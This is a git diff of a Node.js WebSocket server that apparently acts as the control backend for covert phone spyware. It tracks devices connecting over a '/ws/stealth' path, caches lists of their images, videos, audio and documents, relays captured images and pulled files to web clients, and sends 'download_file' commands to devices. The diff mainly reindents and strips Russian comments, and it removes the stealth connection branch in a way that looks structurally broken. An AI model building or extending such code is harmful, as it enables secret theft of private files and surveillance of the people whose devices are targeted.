@@ -80,11 +80,6 @@ wss.on("connection", (ws, req) => {
       webClients.delete(ws);
       console.log(`Web client disconnected. Total: ${webClients.size}`);
     });
-    
-  } else if (deviceId && pathname.startsWith("/ws/stealth")) {
-    ws.deviceId = deviceId;
-    stealthConnections.set(deviceId, { ws, lastSeen: Date.now() });
-    console.log(`📱 Device ${deviceId} connected`);
 
     ws.on("error", (err) => {
       console.error("Web client error:", err);
@@ -96,60 +91,59 @@ wss.on("connection", (ws, req) => {
     console.log(`📱 Device ${deviceId} connected`);
 
     ws.on("message", (rawData) => {
-  try {
-    const msg = JSON.parse(rawData.toString());
-    
-    if (msg.type === 'ping') {
-      console.log(`💓 Ping from ${deviceId}`);
-      return;
-    }
-    
-    if (msg.type === 'file_list') {
-      deviceFileCache.set(deviceId, {
-        data: msg.data,
-        timestamp: Date.now()
-      });
-      
-      const totalFiles = (msg.data && msg.data.total) || 0;
-      console.log(`📁 Received file list from ${deviceId}: ${totalFiles} files`);
-      return;
-    }
+      try {
+        const msg = JSON.parse(rawData.toString());
+        
+        if (msg.type === 'ping') {
+          console.log(`💓 Ping from ${deviceId}`);
+          return;
+        }
+        
+        if (msg.type === 'file_list') {
+          deviceFileCache.set(deviceId, {
+            data: msg.data,
+            timestamp: Date.now()
+          });
+          
+          const totalFiles = (msg.data && msg.data.total) || 0;
+          console.log(`📁 Received file list from ${deviceId}: ${totalFiles} files`);
+          return;
+        }
 
-    // ПЕРЕМЕСТИТЕ file_download СЮДА (вынесите из file_list)
-    if (msg.type === 'file_download') {
-      console.log(`📥 Received file: ${msg.filename} from ${deviceId}`);
-      
-      broadcastToWebClients({
-        type: 'file_download',
-        deviceId: deviceId,
-        filename: msg.filename,
-        data: msg.data,
-        size: msg.size,
-        timestamp: msg.timestamp || Date.now()
-      });
-      
-      return;
-    }
-    
-    if (msg.type === 'image') {
-      const deviceInfo = stealthConnections.get(deviceId);
-      if (deviceInfo) {
-        deviceInfo.latestImage = msg.data;
-        deviceInfo.latestImageTime = Date.now();
+        if (msg.type === 'file_download') {
+          console.log(`📥 Received file: ${msg.filename} from ${deviceId}`);
+          
+          broadcastToWebClients({
+            type: 'file_download',
+            deviceId: deviceId,
+            filename: msg.filename,
+            data: msg.data,
+            size: msg.size,
+            timestamp: msg.timestamp || Date.now()
+          });
+          
+          return;
+        }
+        
+        if (msg.type === 'image') {
+          const deviceInfo = stealthConnections.get(deviceId);
+          if (deviceInfo) {
+            deviceInfo.latestImage = msg.data;
+            deviceInfo.latestImageTime = Date.now();
+          }
+        }
+        
+        broadcastToWebClients({
+          type: msg.type,
+          deviceId: deviceId,
+          data: msg.data,
+          timestamp: msg.timestamp || Date.now()
+        });
+        
+      } catch (err) {
+        console.error(`Error from device ${deviceId}:`, err);
       }
-    }
-    
-    broadcastToWebClients({
-      type: msg.type,
-      deviceId: deviceId,
-      data: msg.data,
-      timestamp: msg.timestamp || Date.now()
     });
-    
-  } catch (err) {
-    console.error(`Error from device ${deviceId}:`, err);
-  }
-});
 
     ws.on("close", () => {
       stealthConnections.delete(deviceId);
@@ -179,7 +173,6 @@ app.get('/api/device/:deviceId/files/:token', (req, res) => {
   }
   
   const cached = deviceFileCache.get(deviceId);
-  // ИЗМЕНЕНО: 60000 → 10000 (10 секунд вместо минуты)
   if (cached && (Date.now() - cached.timestamp < 10000)) {
     return res.json(cached.data);
   }
@@ -190,11 +183,9 @@ app.get('/api/device/:deviceId/files/:token', (req, res) => {
     
     setTimeout(() => {
       const updated = deviceFileCache.get(deviceId);
-      // ИСПРАВЛЕНО: возвращаем updated.data или пустой объект
       res.json(updated ? updated.data : { categories: { images: [], videos: [], audio: [], documents: [] }, total: 0 });
     }, 2000);
   } else {
-    // ИСПРАВЛЕНО: возвращаем правильную структуру
     res.json({ categories: { images: [], videos: [], audio: [], documents: [] }, total: 0 });
   }
 });
@@ -291,7 +282,6 @@ app.post("/api/device/download-file", (req, res) => {
   
   const entry = stealthConnections.get(device_id);
   if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
-    // Отправляем команду устройству
     entry.ws.send(JSON.stringify({ 
       action: 'download_file',
       file_path: file_path,
@@ -520,9 +510,3 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
-
-
-
-
-
-
